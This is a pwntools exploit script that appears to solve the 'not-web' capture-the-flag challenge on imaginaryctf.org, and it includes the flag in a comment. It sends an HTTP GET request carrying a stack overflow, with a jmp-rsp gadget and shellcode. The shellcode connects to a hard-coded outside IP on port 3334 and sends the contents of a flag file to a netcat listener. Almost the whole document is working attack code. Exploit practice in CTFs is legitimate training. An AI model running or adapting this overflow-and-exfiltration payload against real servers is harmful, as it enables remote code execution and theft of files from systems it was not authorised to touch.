#!/usr/bin/env python3

from pwn import *

exe = ELF("./server_patched")

context.binary = exe


def conn():
    r = remote("127.0.0.1", 3030)
    return r

def remotely():
    r = remote("not-web.chal.imaginaryctf.org", 42042)
    return r

def main():
    # ictf{all_pwn_and_no_web_makes_elliot_a_dull_boy}
    # nc -nlvp 3334 (before running the exploit)
    # and change the ip in the shellcode to your ip 
    # (you need to setup ip forwarding on your router)
    r = remotely()

    port = 7654
    ip = "127.0.0.1"
    #r = remote(ip, port)
    
    jmp_rsp  = 0x000000000040105e
    shellcode = asm(shellcraft.sh())
    
    shellcode  = asm(shellcraft.connect("105.158.36.204", 3334))
    shellcode += asm(shellcraft.cat("the_real_flag.txt"))

    shellcode = shellcode.ljust(0x448, p8(0))

    payload = b"GET /"
    payload += p64(0) *0x14
    payload += p64(0)

    for i in range(0x8):
        payload += p64(i)

    payload += p64(jmp_rsp)
    payload += shellcode
    payload += b" HTTP"

    pause()
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
